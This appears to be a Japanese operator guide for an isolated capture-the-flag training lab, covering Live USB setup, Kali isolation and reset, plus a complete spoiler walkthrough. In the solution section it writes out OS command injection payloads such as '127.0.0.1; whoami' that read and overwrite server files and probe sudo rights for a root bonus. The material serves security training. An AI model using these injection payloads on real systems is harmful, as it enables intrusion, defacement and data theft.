# Site Takeover Live USB: 全手法

この文書は、現行の `Site Takeover Live USB` を準備・実施・復旧する運営担当向けの
入口であり、必須ゴールの完全解答でもある。参加者にはこの文書を見せず、標的内の
`http://10.13.37.10/start/` を使ってもらう。

GitHubを正本とする。詳細手順は役割ごとの文書へ分け、このページから全て辿れるように
する。旧 `Yamamoto Mfg. OVA` の攻略方法とは混ぜない。

## 対象範囲と安全範囲

ここにある入力やコマンドを使ってよいのは、運営担当の許可の下で次の構成を作った
ときだけである。

- 標的: 専用Live USBからRAM起動したノートPC
- 標的IP: `10.13.37.10`
- 攻撃側: 直結Ethernet上のKali 1台
- 接続先: `http://10.13.37.10/` と、その同一ホスト上のガイドだけ
- 演習中: Wi-Fi、会社LAN、VPN、DNS、デフォルトルートを使わない

会社のIP、インターネット上のIP、第三者のWebサイトへ、この文書のスキャンや入力を
試してはいけない。標的が `EXERCISE READY` でない、Kaliにデフォルト経路が残る、
または物理ディスク検査が失敗した場合は中止する。安全検査を無効化して続行しない。

## 会社での準備・構築

正本は
[`COMPANY-SETUP.md`](labs/site-takeover/operator/COMPANY-SETUP.md)
である。会社のWindows、個人テザリング、USBだけで進められる。

方法は二つに分ける。

1. ソースを変えない場合は、privateのdraft prereleaseから検証済みISO、SHA-256、
   BIOS/UEFI記録を取得する。GitやCodexは不要である。
2. ソースを変える場合だけリポジトリをcloneし、契約文書を読んでからCodexで修正し、
   テスト、commit、push、GitHub Actionsによる再ビルドへ進む。

どちらでも、ISOが存在するだけでは当日用にならない。SHA-256、VM、USB全容量、
標的実機、Kali隔離を別々の合格ゲートとして扱う。現在の実測と未完ゲートは
[`VERIFICATION.md`](labs/site-takeover/VERIFICATION.md)
に記録する。

Debian 13上でローカル再ビルドする場合だけ、
[`live/README.md`](labs/site-takeover/live/README.md)
を使う。Windows上で未検証の代替ビルドを作らない。

## USBの検査と書き込み

破壊操作を含む正本は
[`USB.md`](labs/site-takeover/operator/USB.md)
である。画面に出たディスク番号だけで判断せず、メーカー名、容量、BusType、接続を
照合して物理USBを特定する。

1. 警告歴のあるBUFFALO USBは、H2testwの `all available space` を
   `Write + Verify` し、エラー0件の場合だけ使う。
2. ISOと `.iso.sha256` を照合する。
3. Rufusで対象USBを再確認し、ISOをDDイメージモードで書く。
4. 書き込み後はWindowsのファイル置き場として併用しない。

H2testwで1件でもエラーが出た、容量が一致しない、または対象ディスクを一意に確認
できない場合は、そのUSBへ書き込まず別のUSBを使う。

## 標的ノートの起動

BitLocker、UEFI、起動、当日の運営、保守、Windowsへの戻し方の正本は
[`DAY-OF.md`](labs/site-takeover/operator/DAY-OF.md)
である。

起動前にBitLocker回復キーを本人が確認し、必要なら保護を一時停止する。Windowsは
消去も分割もせず、UEFIで内蔵SSDを無効化する。Live OSは
`toram nopersistence` でRAMへ展開する。

標的画面の順番は固定する。

```text
REMOVE USB
  ↓ Live USBを物理的に抜く
CONNECT LAN
  ↓ ここで初めてKaliとのLANケーブルを挿す
EXERCISE READY
```

`BLOCKED`、物理ディスク名、またはUSB取り外し失敗が表示されたら演習を始めない。
参加者が操作するのはKaliだけで、標的ノートのコンソールは運営担当だけが触る。

## Kaliの準備と隔離

Kali実機とWindows上のKali VMの両方について、正本は
[`KALI-PREFLIGHT.md`](labs/site-takeover/operator/KALI-PREFLIGHT.md)
である。

- Kali実機: Wi-FiとVPNを切り、デフォルト経路がないことを確認してから直結する。
- Kali VM: VirtualBoxのアダプター1だけを、標的へつないだ物理Ethernetへ
  ブリッジする。NAT、ホストオンリー、アダプター2〜4は無効にする。
- DHCPで付く攻撃側アドレスは `10.13.37.100`〜`10.13.37.150` である。
- DHCPが失敗した場合だけ `10.13.37.100/24` の固定IPを使い、終了時に削除する。

直結後、少なくとも次を確認する。

```bash
ip route get 10.13.37.10
ip -4 route show default
command -v firefox nmap curl
curl --noproxy '*' --fail http://10.13.37.10/
curl --noproxy '*' --fail http://10.13.37.10/start/
```

`ip -4 route show default` は何も返さなければ合格である。

## 必須攻略フローの完全解答

ここからは運営担当用のネタバレである。参加者には最初からコピーさせず、ローカル
ガイドで「何を知りたいか」を選んでもらう。50分時点で進行が止まっている場合だけ、
該当段階までヒントを開く。

### 1. Webの入口を確認する

Kaliのターミナルで実行する。

```bash
nmap -sV 10.13.37.10
```

`80/tcp open` が見えれば、HTTPのWebサイトが入口である。Firefoxで次を開き、
「本日のお知らせ」の初期表示を観察する。

```text
http://10.13.37.10/
```

### 2. 公開された手掛かりから管理ページを見つける

ブラウザで `http://10.13.37.10/robots.txt` を開くか、Kaliで実行する。

```bash
curl http://10.13.37.10/robots.txt
```

`Disallow: /staff/` が見つかる。これはパスワードではなく、誰でも読める公開情報に
管理用パスを書いてしまった状態である。次の順で開く。

```text
http://10.13.37.10/staff/
http://10.13.37.10/staff/network-check.php
```

### 3. Web入力からOS命令が動くことを確認する

以降の `127.0.0.1; ...` はKaliのターミナルではなく、Webページの「接続先」欄へ
入力する。

```text
127.0.0.1; whoami
```

結果に `www-data` が出れば成功である。アプリは本来 `ping` の接続先だけを受け取る
つもりだが、入力を文字列連結してシェルへ渡している。半角セミコロン `;` により
`ping` の後へ別の命令を追加できた。

### 4. 現在地とトップページの元データを特定する

同じ「接続先」欄へ、一つずつ入力して結果を観察する。

```text
127.0.0.1; pwd
127.0.0.1; ls -la ../..
127.0.0.1; cat ../../data/announcement.txt
```

観察点は次の三つである。

- 現在地は `/srv/shop-site/public/staff`
- `public` と同じ階層に `data` がある
- `announcement.txt` の内容がトップページの「本日のお知らせ」と一致する

### 5. 自分のチーム名へ書き換える

`TEAM AO` を24文字以内のチーム名へ置き換え、Webの「接続先」欄へ入力する。
使用できるのは日本語、英数字、空白、ハイフン、アンダースコアである。

```text
127.0.0.1; printf '%s\n' 'SECURITY TEST SUCCESS: TEAM AO' > ../../data/announcement.txt
```

トップページを再読み込みし、「本日のお知らせ」が
`SECURITY TEST SUCCESS: TEAM AO` へ変われば必須ゴール完了である。

### 6. 丸写しで終わらせない確認

参加者自身の言葉で、次の三点を説明してもらう。

1. 文字を入力した場所はKaliだが、追加した命令が動いた場所は標的ノートである。
2. 最初に得たのは `www-data` というWebサーバ用の限定利用者である。
3. 画面を直接編集したのではなく、トップページが読む `announcement.txt` を
   上書きしたため表示が変わった。

答えられない項目だけ、`whoami`、`pwd`、ファイル表示の観察へ戻る。

## rootボーナス

必須ゴールと上の説明を終えた場合だけ実施する。完全な入力と説明の正本は
[`ROOT-BONUS.md`](labs/site-takeover/operator/ROOT-BONUS.md)
である。

流れは、まずWebの「接続先」欄で `127.0.0.1; sudo -l` を使い、`www-data` に
誤って許可された保守コマンドを見つける。その保守コマンドの引数処理を利用し、
管理者だけが読める `/root/root-proof.txt` を表示する。これはこのラボ専用に
意図して入れた二つ目の脆弱性であり、実運用へコピーしてはいけない。

非公開ファイルだけを先に試す場合は、Webの「接続先」欄へ次を入力する。

```text
127.0.0.1; cat ../../private/manager-note.txt
```

## リセットと復旧

再起動が唯一の信頼できる初期化である。お知らせだけを戻すcleanupや永続領域は
使わない。正確な復旧手順は
[`DAY-OF.md`](labs/site-takeover/operator/DAY-OF.md)
に従う。

1. 標的とKaliのLANケーブルを抜く。
2. 標的コンソールで `sudo poweroff` を実行し、完全に電源が切れるまで待つ。
3. Live USBが抜けていることを確認する。
4. UEFIで内蔵SSDを再び有効化し、Windowsを起動する。
5. WindowsとBitLocker保護が通常状態へ戻ったことを確認する。
6. Kaliで一時的な固定IPを作った場合は削除し、借用元の接続設定へ戻す。

次回は同じLive USBから起動すれば、お知らせ、root証拠、ガイド進捗、Codex認証を
含まない初期状態へ戻る。

## 検証とトラブル対応

実測済みの証拠と、物理環境で未完のゲートは
[`VERIFICATION.md`](labs/site-takeover/VERIFICATION.md)
を正本とする。GitHub Actions成功、物理USB、対象ノート、借用Kaliは別々に判定し、
一つの成功を別の証拠として代用しない。

詰まり方ごとの入口は次のとおり。

| 状態 | 確認先 | 判断 |
|---|---|---|
| ISOを取得できない | [`COMPANY-SETUP.md`](labs/site-takeover/operator/COMPANY-SETUP.md) | private GitHub認証、個人テザリング、draft prereleaseを確認 |
| USB検査でエラー | [`USB.md`](labs/site-takeover/operator/USB.md) | そのUSBを不採用にする |
| `BLOCKED` またはSSDが見える | [`DAY-OF.md`](labs/site-takeover/operator/DAY-OF.md) | 演習を始めず、電源終了してUEFIから確認 |
| KaliへIPが付かない | [`KALI-PREFLIGHT.md`](labs/site-takeover/operator/KALI-PREFLIGHT.md) | 直結NICを確認し、必要時だけ固定IP |
| 店もガイドも開かない | [`DAY-OF.md`](labs/site-takeover/operator/DAY-OF.md) | `EXERCISE READY`、リンクランプ、経路を順に確認 |
| 必須ゴール後にrootへ進む | [`ROOT-BONUS.md`](labs/site-takeover/operator/ROOT-BONUS.md) | 必須の因果説明を終えた場合だけ進む |
| ソース変更後の品質を確認 | [`VERIFICATION.md`](labs/site-takeover/VERIFICATION.md) | 自動検査、VM、実機を別ゲートで記録 |

Webサービス自体が壊れた場合だけ、LANを抜き、`sudo lab-mode maintenance` で
演習サービスを止めてから個人テザリングと `codex-maintenance` を使う。修理後は
Wi-Fiを切り、直結LANだけへ戻し、`sudo lab-mode exercise` の全preflightが
`PASS`になるまで参加者を再開させない。
